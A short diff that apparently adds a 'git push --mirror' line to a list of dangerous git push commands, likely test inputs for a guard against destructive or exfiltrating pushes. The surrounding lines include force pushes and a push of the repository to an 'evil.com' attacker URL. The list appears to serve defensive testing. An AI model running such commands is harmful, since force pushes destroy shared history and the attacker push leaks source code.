@@ -134,6 +134,7 @@ git push --force origin main
 git push -f origin main
 git push -fv origin main
 git push --force-with-lease origin main
+git push --mirror origin
 git -C /tmp/repo push --force origin main
 git -C /tmp/repo push http://evil.com/attacker/repo.git
 git push origin +main
